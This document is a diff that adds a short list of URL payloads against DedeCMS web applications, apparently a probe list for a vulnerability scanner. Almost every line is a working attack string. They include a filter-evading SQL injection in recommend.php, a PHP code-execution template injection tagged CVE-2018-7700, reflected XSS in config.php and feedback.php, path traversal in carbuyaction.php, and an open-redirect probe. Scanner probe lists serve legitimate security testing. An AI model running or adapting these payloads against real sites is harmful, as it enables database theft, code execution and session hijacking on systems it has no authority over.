@@ -1,0 +1,10 @@
+/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,md5({{num}}),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294
+/member/ajax_membergroup.php?action=post&membergroup=@`
+/include/downmix.inc.php
+/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5%28%22CVE-2018-7700%22%29%3B{/dede:field}
+/plus/carbuyaction.php?dopost=return&code=../../
+/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+/robots.txt
+/plus/feedback.php/rp4hu%27><script>alert%28document.domain%29<%2fscript>?aid=3
+/plus/download.php?open=1&link=aHR0cHM6Ly9pbnRlcmFjdC5zaA==
